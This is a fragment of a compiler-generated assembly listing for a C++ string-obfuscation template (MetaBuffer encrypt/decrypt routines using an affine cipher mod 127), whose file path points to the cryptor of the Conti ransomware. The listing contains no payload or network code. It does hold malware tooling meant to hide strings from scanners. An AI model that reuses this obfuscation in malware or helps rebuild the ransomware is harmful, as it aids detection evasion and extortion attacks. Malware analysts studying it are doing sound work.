  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	b8 01 00 00 00	 mov	 eax, 1
  003cf	48 6b c0 16	 imul	 rax, rax, 22
  003d3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003da	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003e5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  003ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003f1	88 41 17	 mov	 BYTE PTR [rcx+23], al
  003f4	b8 01 00 00 00	 mov	 eax, 1
  003f9	48 6b c0 17	 imul	 rax, rax, 23
  003fd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00404	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00408	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0040f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00414	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0041b	88 41 18	 mov	 BYTE PTR [rcx+24], al
  0041e	b8 01 00 00 00	 mov	 eax, 1
  00423	48 6b c0 18	 imul	 rax, rax, 24
  00427	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0042e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00432	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00439	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  0043e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00445	88 41 19	 mov	 BYTE PTR [rcx+25], al
  00448	b8 01 00 00 00	 mov	 eax, 1
  0044d	48 6b c0 19	 imul	 rax, rax, 25
  00451	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00458	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0045c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00463	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
  00468	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0046f	88 41 1a	 mov	 BYTE PTR [rcx+26], al
  00472	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00479	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  0047d	88 85 c0 00 00
	00		 mov	 BYTE PTR tv280[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00483	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0048a	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00491	5f		 pop	 rdi
  00492	5d		 pop	 rbp
  00493	c3		 ret	 0
??0?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::MetaBuffer<53,122,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 1d	 sub	 eax, 29
  0002d	6b c0 25	 imul	 eax, eax, 37		; 00000025H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 67	 imul	 eax, eax, 103		; 00000067H
  0002d	83 c0 1d	 add	 eax, 29
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 1a	 cmp	 QWORD PTR i$1[rbp], 26
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ PROC ; MetaBuffer<103,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
